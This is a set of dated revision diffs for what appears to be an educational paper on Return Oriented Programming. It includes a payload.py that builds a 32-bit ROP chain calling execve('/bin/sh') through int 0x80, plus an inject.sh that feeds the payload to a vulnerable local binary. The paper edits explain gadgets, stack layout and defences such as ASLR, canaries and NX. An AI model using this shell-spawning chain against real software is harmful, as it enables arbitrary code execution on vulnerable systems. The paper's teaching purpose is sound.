 %%%% 8. BILBIOGRAPHY %%%%

### 2023-02-17 inject.sh

@@ -1,0 +1,2 @@
+python3.10 payload.py
+./vuln "`cat payload`"

### 2023-02-17 payload.py

@@ -13,32 +13,42 @@ filler = 0x11111111
 
 p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii') # Padding + EBP
  
-p += pack('<I', pop_edx) # write address of .data into edx
+# write /bin at .data
+p += pack('<I', pop_edx)
 p += pack('<I', data)
 p += pack('<I', filler)
-p += pack('<I', pop_eax) # write /bin into eax
+p += pack('<I', pop_eax)
 p += bytes('/bin', 'ascii')
-p += pack('<I', mov_edx_eax) # mov /bin to .data
-p += pack('<I', pop_edx) # address of .data + 4 into edx
+p += pack('<I', mov_edx_eax)
+# write //sh at .data + 4
+p += pack('<I', pop_edx)
 p += pack('<I', data + 4)
 p += pack('<I', filler)
-p += pack('<I', pop_eax) # //sh into eax
+p += pack('<I', pop_eax)
 p += bytes('//sh', 'ascii')
-p += pack('<I', mov_edx_eax) # mov //sh to .data + 4
-p += pack('<I', pop_edx) # address of .data + 8 into edx
+p += pack('<I', mov_edx_eax)
+# \0 at .data + 8
+p += pack('<I', pop_edx)
 p += pack('<I', data + 8)
 p += pack('<I', filler)
-p += pack('<I', xor_eax_eax) # clear eax
-p += pack('<I', mov_edx_eax) # write null after /bin/sh
-p += pack('<I', pop_ebx) # write address of string that points to program into ebx
+p += pack('<I', xor_eax_eax)
+p += pack('<I', mov_edx_eax)
+# write address of string that points to program into ebx
+p += pack('<I', pop_ebx)
 p += pack('<I', data)
-p += pack('<I', pop_ecx) # write arguments into ecx
+# write arguments into ecx
+p += pack('<I', pop_ecx)
 p += pack('<I', data + 8)
-p += pack('<I', xor_edx_edx) # clear edx
-p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
+# write environment into edx
+p += pack('<I', xor_edx_edx)
+# set eax to 11
+p += pack('<I', xor_eax_eax)
 for _ in range(11):
     p += pack('<I', inc_eax)
-p += pack('<I', int_80) # call interrupt
+# call interrupt
+p += pack('<I', int_80)
+
 print(str(p)[2:-1])
+
 with open('payload', 'wb') as file:
     file.write(p)

### 2023-02-17 paper.tex
changes

@@
 \begin{abstract}
-  Return Oriented Programming is a buffer overflow exploitation technique developed in 2007.
+  In this paper we introduce the concept, demonstrate an attack and talk about the different protection mechanisms of Return Oriented Programming.
+ROP is a buffer overflow exploitation technique developed in 2007.
 Under certain circumstances it can provide arbitrary code execution on assembly level.
-Luckily the development of binary exploitation protections like stack canaries, bounds checking and ASLR made the effort required for developing an attack for that specific target and attacking the target too high to make it practicable in most cases, however, old soft-/hardware are still vulnerable and the mentioned protections have shown to be vulnerable themselves, with high enough reward ROP may be a devastating technique for black-hats.
+Modern 64 Bit binaries are decently secure against ROP with ASLR and stack protections enabled.
+32 Bit binaries or binaries compiled for non PC systems may not provide the same protection though and may be vulnerable to ROP.
 \end{abstract}
+
+\section{Introduction}
 
@@
 It has been developed to circumvent the NX-BIT protection that protects the stack from being executed.
-At the time of writing this paper modern techniques like stack carnaries and ASLR make these attacks hard and very time consuming on modern systems.
-That is not to say ASLR and stack canaries can not be broken by bruteforcing or side channels.
-Since there are millions of running systems with old hard-, firm- and software that is possibly vulnerable to these kinds of attacks it is still relevant to this day.
-The main idea in ROP is based on chaining return addresses to code just before a return and therefore allowing almost arbitrary cpu instructions to be chained.
+The general consensus is that modern binaries are practically not vulnerable to buffer overflow attacks, but there is a lot of research surrounding breaking of these security measures that shows practical strength of these security measures does not equal the theoretical strength due to side channels, bugs or other exploits.~\cite{aslr} With high enough reward ROP may be a devastating technique for black-hats, because of that it is important to raise awareness about binary exploitation generally and ROP.
+Because of that this paper will demonstrate the underlying theory and demonstrate it with an attack on a vulnerable binary.
 
@@
 \bltCommand{ropcommand.sh}{Exporting gadgets with ROPgadget}{dumpallgadgets}
-This command produces an output with results similar to this.
+This command produces an output with results similar to this~\cref{outputropgadget}.
 \bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
@@
 because of that the buffer has to be filled with more bytes than the buffer holds if $s \mod 16 \neq 0$ holds true, s being the buffer size in Bytes.
-\newpage
 \begin{figure}[h!]
@@
 \end{figure}
+\\
 \subsection{ROP Runtime Behaviour}
@@
 \end{figure}
-\section{Attack}
+
+\section{Attack: Opening a Shell}
 \label{sec:attack}
@@
 \subsection{Phases of developing the attack}
-\paragraph{Phases}
 The attack consists of several phases
@@
 \end{enumerate}
-\subsection{The attack}
+\subsection{Opening a Shell}
 \paragraph{Specification and abstract payload}
@@
 Since the target program does not have any global or static variables we can override this segment with arbitrary character sequences.
-In
 \bltCommand{objdump.sh}{Determine the Address of .data}{command:finddatasegment}

### 2023-02-17 paper.tex
changes

@@
 \begin{abstract}
-  In this paper we introduce the concept, demonstrate an attack and talk about the different protection mechanisms of Return Oriented Programming.
 ROP is a buffer overflow exploitation technique developed in 2007.
-Under certain circumstances it can provide arbitrary code execution on assembly level.
-Modern 64 Bit binaries are decently secure against ROP with ASLR and stack protections enabled.
+Under certain circumstances it can provide arbitrary code execution on assembly level, because of that it is a devastating technique for black-hats.
+Modern 64 Bit binaries are generally decently secure against ROP with ASLR and stack protections enabled.
 32 Bit binaries or binaries compiled for non PC systems may not provide the same protection though and may be vulnerable to ROP.

### 2023-02-17 paper.tex
changes

@@
 
-\section{Introduction}
-
 %%%% 7. PAPER CONTENT %%%%
@@
 It has been developed to circumvent the NX-BIT protection that protects the stack from being executed.
-The general consensus is that modern binaries are practically not vulnerable to buffer overflow attacks, but there is a lot of research surrounding breaking of these security measures that shows practical strength of these security measures does not equal the theoretical strength due to side channels, bugs or other exploits.~\cite{aslr} With high enough reward ROP may be a devastating technique for black-hats, because of that it is important to raise awareness about binary exploitation generally and ROP.
-Because of that this paper will demonstrate the underlying theory and demonstrate it with an attack on a vulnerable binary.
+The general consensus is that modern binaries are practically not vulnerable to buffer overflow attacks, but there is a lot of research surrounding breaking of these security measures that shows practical strength of these security measures does not equal the theoretical strength due to side channels, bugs or other exploits.~\cite{aslr} Because of its power it is important to raise awareness about binary exploitation generally and ROP.
+Because of that this paper will explain the underlying theory and demonstrate it with an attack on a vulnerable binary.
 
@@
 \bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
-These are only 10 Lines out of the 8244 lines found by the tool though and i purposefully filtered out some good and bad ones for demonstration.
+These are only 7 gadgets out of the 8180 gadgets found by the tool though and have been purposefully picked for demonstration.
 It is clearly visible that many candidates for ROP can be found, even in a file with a relatively small size of 72 kB.
@@
 Examples for system calls include io and \Verb+execve+ which allows to execute arbitary programs.
-In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.~\cite{ropsla} One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
-This will be demonstrated in~\cref{sec:attack}.
+In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.~\cite{ropsla} One of the most powerful system calls for blackhats is execve with \bltInlineVerb{/bin/sh} as argument since it gives the attacker full system access once privileges have been elevated.
 \subsection{Filtering the gadgets}
@@
 In order to find the required gadgets we can use the tools directly or we can use regular expressions.
-In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets.
+In order to make this paper more general and easy to replicate the method using regular expressions will be demonstrated.
 \paragraph{Gadgets and their corresponding Regular Expression}
-The following table describes what regex we can use to find the gadgets required for the attack.
+The following examples demonstrate how regular expressions can be used to search gadgets.
 \begin{itemize}
@@
 \subsection{Stack}
-The following graphic~\cref{fig:stack} is an illustration of how the stack changes when injecting the payload.
+Graphic~\cref{fig:stack} is an illustration of how the stack changes when injecting the payload.
 The buffer first has to be filled.
 In binary exploitation the letter \Verb+A+ is used for that most of the time, it has an easy to identify hexadecimal value of \bltInlineVerb{0x41}.
-It is important to note that without any special compiler options the stack will be aligned in \bltInlineVerb{dword}'s/16 Byte blocks.
-because of that the buffer has to be filled with more bytes than the buffer holds if $s \mod 16 \neq 0$ holds true, s being the buffer size in Bytes.
-\begin{figure}[h!]
+It is important to note that the padding required may be bigger than the buffer due to compiler based stack alignment.
+\begin{figure}[H]
   \centering
-  \includegraphics[width=0.79\textwidth]{stackropoffsec.png}
+  \includegraphics[width=0.95\textwidth]{stackropoffsec.png}
   \caption{The stack when injecting the payload}
@@
 \end{figure}
-\\
 \subsection{ROP Runtime Behaviour}
-The following graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in \bltInlineVerb{main}.
+Graphic~\cref{fig:executionatruntime} illustrates how the gadgets get executed once the instruction pointer \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in \bltInlineVerb{main}.
 Once this happens the execution gets redirected to the first gadget and executes the instructions in it.
 As soon as \bltInlineVerb{eip} points to the \bltInlineVerb{ret} in the 1st gadget the address of the 2nd gadget is \bltInlineVerb{pop}'d into \bltInlineVerb{eip} and execution continues there, from there the same thing happens again until execution reaches the end of the last gadget.
-\begin{figure}[h!]
+\begin{figure}[H]
   \centering
@@
 For the example in this paper we want to open a shell, for that the simplest way is to execute an \bltInlineVerb{execve} system call.
-The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}~\cite{proggen-rop}
+The program state illustrated in graphic~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}~\cite{proggen-rop}
 \begin{figure}[h]
@@
 As seen in the example we can define all the addresses, gadgets and other parameters as variables and reuse them in the \bltInlineVerb{pack} calls, this way changing a gadget only requires one value to be changed.
-The different
+The output gets written into a file and can then be used for the attack.
 \bltCode{payload.py}{python}{Payload to open /bin/sh}{code:payloadbinsh}
@@
 It is likely that there are systems still in use today which are vulnerable to this kind of attack due to not having these protections or the protections themselves being attackable.
-Since it allows almost arbitrary code execution it is very important to identify these devices and patch or replace them.
+Since it can allow arbitrary code execution it is very important to identify these devices and patch or replace them.
 \paragraph{ASLR}
@@
 With executables that have PIE enabled ROP is still possible but only with ASLR disabled~\cite{el-sherei}.
-With the compiler options used for this example PIE is disabled and ASLR seems to have no effect on the exploit.
-This is because the ASLR settings \Verb+1+ and \Verb+2+ only randomize shared libraries and PIE binaries~\cite{rny}, since the program has been compiled with the \bltInlineVerb{-static} option, which implicitly compiles the program to not be position independent, ASLR is not being used, even when activated.
+With the compiler option \bltInlineVerb{-static} used for this example PIE is implicitly disabled and ASLR seems to have no effect on the exploit.
+This is likely because the ASLR settings \Verb+1+ and \Verb+2+ only randomize shared libraries and PIE binaries~\cite{rny}, meaning ASLR is disabled in this example, even when the value in \bltInlineVerb{/proc/sys/kernel/randomize_va_space} is \bltInlineVerb{1} or \bltInlineVerb{2}.
 
@@
 Stack canaries are one of the most effective approaches against ROP, they are enabled by default and prevent most forms of buffer overflows, however, stack canaries can be based on a small entropy pool and can therfore be bruteforced with an effort significantly smaller than regular bruteforcing.
-Depending on the target it can still be profitable and possible to bruteforce it even with a big entropy pool and high randomness.
+Depending on the target it can still be profitable and possible to bruteforce it even with a big entropy pool.
 \paragraph{NX}
@@
 Because of that they were able to perform a buffer overflow attack like ret2libc on an Apache server with an average of 216 seconds.~\cite{aslr}
+
+\section{Conclusion}
+As it has been demonstrated Return Oriented Programming is a powerful exploitation technique which should be taken seriously.
+As we were able to see the only way to make a binary relatively safe is to compile it as 64 Bit with stack canaries, bounds checking and ASLR enabled, though even then side channel attacks, bugs and bruteforcing based on a poor entropy pool may make an attack possible.
+Replacing or patching vulnerable devices is very important and more research on this topic paired with direct action in systems design may be necessary to keep up with black-hats.
 %%%% 8. BILBIOGRAPHY %%%%

### 2023-02-17 paper.tex
changes

@@
 As it has been demonstrated Return Oriented Programming is a powerful exploitation technique which should be taken seriously.
-As we were able to see the only way to make a binary relatively safe is to compile it as 64 Bit with stack canaries, bounds checking and ASLR enabled, though even then side channel attacks, bugs and bruteforcing based on a poor entropy pool may make an attack possible.
+From the research surrounding the attacking technique and protection mechanisms the only way to make the binary relatively safe is to compile it as 64 Bit executable with stack canaries, bounds checking and ASLR enabled, though even then side channel attacks, bugs and bruteforcing based on a poor entropy pool may make an attack possible.
 Replacing or patching vulnerable devices is very important and more research on this topic paired with direct action in systems design may be necessary to keep up with black-hats.
